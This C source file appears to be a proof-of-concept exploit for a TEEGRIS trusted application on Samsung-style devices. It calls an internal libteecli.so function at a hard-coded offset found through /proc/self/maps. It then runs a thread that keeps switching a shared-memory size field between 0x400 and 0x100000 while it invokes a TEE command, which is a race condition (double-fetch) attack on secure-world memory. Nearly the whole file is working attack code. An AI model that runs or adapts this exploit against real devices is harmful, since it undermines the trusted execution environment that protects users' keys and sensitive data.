#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "tee_client_api.h"
#include "repro.h"
#include "tee.h"
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>  

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
typedef TEEC_Result (*teec_pre_process_operation_impl_t)(TEEC_Context* ctx,
            TEEC_Operation* operation,
            struct tee_ioctl_param* params,
            TEEC_SharedMemory* shms);

//TEEC_Result (*TEEC_AllocateSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
#define teec_pre_process_operation_offset 0x2434

uintptr_t get_lib_base(const char *libname) {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("fopen");
        return 0;
    }

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, libname)) {
            uintptr_t base = 0;
            // The address range looks like "7f9a2c0000-7f9a2e0000 ..."
            if (sscanf(line, "%lx-%*lx", &base) == 1) {
                fclose(fp);
                return base;
            }
        }
    }

    fclose(fp);
    return 0;
}



#define CMD 0x2000 

typedef struct someshit{
    int mustbeone;
    int size;
} someshit;

void* mod_thread(void* arg){
    someshit* wow = (someshit*)arg;
    while(1){
        wow->size = 0x400;
        wow->size = 0x100000; 
    }
}

void setup_mem(someshit* m1, someshit* m2){
    m1->mustbeone = 1;
    m1->size = 0x400;
    m2->mustbeone = 1;
    m2->size = 0x400;
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    pthread_t tid;

#if EMULATE 
    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
    
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    
    op.params[0].tmpref.buffer = mem_area1;  
    op.params[0].tmpref.size =  0x608; 
    op.params[1].tmpref.buffer = mem_area2; 
    op.params[1].tmpref.size =  0x608; 
    
    setup_mem(mem_area1, mem_area2);  
    
    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
        perror("pthread_create failed");
        return;
    } 

    TEEC_Result res = TEEC_InvokeCommand_impl(session, CMD, &op, &err_origin);

#else
    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
    
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    
    op.params[0].tmpref.buffer = mem_area1; 
    op.params[0].tmpref.size = 0x608; 
    op.params[1].tmpref.buffer = mem_area2;
    op.params[1].tmpref.size = 0x608; 
    setup_mem(mem_area1, mem_area2);  
    //TEEC_Result res = TEEC_InvokeCommand_impl(session, CMD, &op, &err_origin);
   
    #define TEEC_CONFIG_PAYLOAD_REF_COUNT 4
    uint64_t buf[(sizeof(struct tee_ioctl_invoke_arg) +
            TEEC_CONFIG_PAYLOAD_REF_COUNT *
                sizeof(struct tee_ioctl_param)) /
            sizeof(uint64_t)] = { 0 };
    struct tee_ioctl_buf_data buf_data;
    struct tee_ioctl_invoke_arg *arg;
    struct tee_ioctl_param *params;
    TEEC_Result res;
    uint32_t eorig;
    TEEC_SharedMemory shm[TEEC_CONFIG_PAYLOAD_REF_COUNT];
    int rc;
    buf_data.buf_ptr = (uintptr_t)buf;
    buf_data.buf_len = sizeof(buf);

    arg = (struct tee_ioctl_invoke_arg *)buf;
    arg->num_params = TEEC_CONFIG_PAYLOAD_REF_COUNT;
    params = (struct tee_ioctl_param *)(arg + 1);

    arg->session = session->session_id;
    arg->func = CMD;
    
    op.session = session;
   
	teec_pre_process_operation_impl_t teec_pre_process_operation_impl =
        (teec_pre_process_operation_impl_t)((uint8_t*)get_lib_base("libteecli.so") + teec_pre_process_operation_offset);			
 
    res = teec_pre_process_operation_impl(session->ctx, &op, params, shm);
    if (res != TEEC_SUCCESS) {
        printf("teec_pre_process_operation failed!! %x\n", res);
        exit(-1);
    }

	//strcpy(shm[1].buffer, "wtf???");
	//printf("shm: %s\n", shm[1].buffer);
	mem_area2 = shm[1].buffer;
    setup_mem(mem_area1, mem_area2);  
    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
        perror("pthread_create failed");
        return;
    }

    rc = ioctl(session->ctx->fd, TEE_IOC_INVOKE, &buf_data);
    res = arg->ret;
    err_origin = arg->ret_origin; 
#endif
    printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
}


int main(int argc, char **argv)
{
    char* ta = "3d08821c-33a6-11e6-a1fa089e01c83aa2";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    printf("[+] sending query...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
